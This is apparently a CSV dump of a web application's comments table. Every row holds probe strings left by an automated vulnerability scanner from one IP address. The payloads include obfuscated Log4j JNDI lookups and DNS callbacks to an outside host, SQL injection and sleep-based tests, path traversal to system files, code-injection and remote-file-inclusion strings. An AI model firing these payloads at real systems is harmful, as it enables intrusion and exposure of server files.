pro_id,user_id,comment_id,ip,status,comment,date_comment
1,529,13,162.222.89.251,1,555,2022-08-15 20:56:13
1,529,14,162.222.89.251,1,1efH3z5CO,2022-08-15 20:56:14
1,529,15,162.222.89.251,1,555,2022-08-15 20:56:14
1,529,16,162.222.89.251,1,555,2022-08-15 20:56:15
1,529,17,162.222.89.251,1,555,2022-08-15 20:56:16
1,529,18,162.222.89.251,1,JQ0BPYOT,2022-08-15 20:56:16
1,529,19,162.222.89.251,1,${j${::-n}di:dns${::-:}//hitrrgqwqbpql51f27${::-.}bxss.me}zzzz,2022-08-15 20:56:16
1,529,20,162.222.89.251,1,response.write(9398163*9502267),2022-08-15 20:56:16
1,529,21,162.222.89.251,1,-1 OR 2+849-849-1=0+0+0+1 -- ,2022-08-15 20:56:16
1,529,22,162.222.89.251,1,"+response.write(9398163*9502267)+",2022-08-15 20:56:17
1,529,23,162.222.89.251,1,-1 OR 2+19-19-1=0+0+0+1,2022-08-15 20:56:17
1,529,24,162.222.89.251,1,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j.009247.1708-6579.1708.879f4${::-.}1${::-.}bxss.me}},2022-08-15 20:56:17
1,529,25,162.222.89.251,1,1,2022-08-15 20:56:18
0,529,26,162.222.89.251,1,555,2022-08-15 20:56:18
1,529,27,162.222.89.251,1,"-1"" OR 2+318-318-1=0+0+0+1 -- ",2022-08-15 20:56:18
0,529,28,162.222.89.251,1,555,2022-08-15 20:56:18
1,529,29,162.222.89.251,1,555,2022-08-15 20:56:19
1,529,30,162.222.89.251,1,"if(now()=sysdate(),sleep(15),0)",2022-08-15 20:56:19
1,529,31,162.222.89.251,1,555,2022-08-15 20:56:19
1,529,32,162.222.89.251,1,555,2022-08-15 20:56:19
1,529,33,162.222.89.251,1,0,2022-08-15 20:56:19
1,529,34,162.222.89.251,1,<blank>,2022-08-15 20:56:34
1,529,35,162.222.89.251,1,555,2022-08-15 20:56:34
1,529,36,162.222.89.251,1,../../../../../../../../../../../../../../etc/passwd,2022-08-15 20:56:34
1,529,37,162.222.89.251,1,r61PZ7GA,2022-08-15 20:56:34
1,529,38,162.222.89.251,1,555,2022-08-15 20:56:34
1,529,39,162.222.89.251,1,0,2022-08-15 20:56:35
1,529,40,162.222.89.251,1,555,2022-08-15 20:56:41
1,529,41,162.222.89.251,1,../../../../../../../../../../../../../../windows/win.ini,2022-08-15 20:56:41
1,529,42,162.222.89.251,1,"555<esi:include src=""http://bxss.me/rpb.png""/>",2022-08-15 20:56:41
1,529,43,162.222.89.251,1,555,2022-08-15 20:56:41
1,529,44,162.222.89.251,1,555,2022-08-15 20:56:41
1,529,45,162.222.89.251,1,<blank>,2022-08-15 20:56:41
1,529,46,162.222.89.251,1,0,2022-08-15 20:56:41
1,529,47,162.222.89.251,1,555,2022-08-15 20:56:44
1,529,48,162.222.89.251,1,${9999791+9999419},2022-08-15 20:56:44
1,529,49,162.222.89.251,1,../555,2022-08-15 20:56:44
1,529,50,162.222.89.251,1,http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg,2022-08-15 20:56:44
1,529,51,162.222.89.251,1,555&n982989=v924716,2022-08-15 20:56:45
1,529,52,162.222.89.251,1,0,2022-08-15 20:56:45
1,529,53,162.222.89.251,1,),2022-08-15 20:56:45
1,529,54,162.222.89.251,1,1some_inexistent_file_with_long_name\x00.jpg,2022-08-15 20:56:45
1,529,55,162.222.89.251,1,555,2022-08-15 20:56:45
1,529,56,162.222.89.251,1,0,2022-08-15 20:56:45
1,529,57,162.222.89.251,1,!(()&&!|*|*|,2022-08-15 20:57:00
1,529,58,162.222.89.251,1,Http://bxss.me/t/fit.txt,2022-08-15 20:57:00
1,529,59,162.222.89.251,1,<blank>,2022-08-15 20:57:00
1,529,60,162.222.89.251,1,0,2022-08-15 20:57:00
1,529,61,162.222.89.251,1,^(#$!@#$)(()))******,2022-08-15 20:57:00
1,529,62,162.222.89.251,1,555,2022-08-15 20:57:00
1,529,63,162.222.89.251,1,555,2022-08-15 20:57:00
1,529,64,162.222.89.251,1,http://bxss.me/t/fit.txt?.jpg,2022-08-15 20:57:00
1,529,65,162.222.89.251,1,0,2022-08-15 20:57:01
1,529,66,162.222.89.251,1,555,2022-08-15 20:57:07
1,529,67,162.222.89.251,1,555,2022-08-15 20:57:07
1,529,68,162.222.89.251,1,bxss.me,2022-08-15 20:57:07
1,529,69,162.222.89.251,1,".gethostbyname(lc("hitop"."nxzbzawydfd1d.bxss.me."))."A".chr(67).chr(hex("58")).chr(105).chr(70).chr(122).chr(73).",2022-08-15 20:57:08
1,529,70,162.222.89.251,1,555,2022-08-15 20:57:08
1,529,71,162.222.89.251,1,0,2022-08-15 20:57:08
1,529,72,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,73,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,74,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,75,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,76,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,77,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,78,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,79,162.222.89.251,1,555,2022-08-15 20:57:33
1,529,80,162.222.89.251,1,";print(md5(31337));$a=",2022-08-15 20:57:33
1,529,81,162.222.89.251,1,HttP://bxss.me/t/xss.html?\x00,2022-08-15 20:57:34
1,529,82,162.222.89.251,1,555,2022-08-15 20:57:34
1,529,83,162.222.89.251,1,${@print(md5(31337))},2022-08-15 20:57:34
1,529,84,162.222.89.251,1,bxss.me/t/xss.html?\x00,2022-08-15 20:57:34
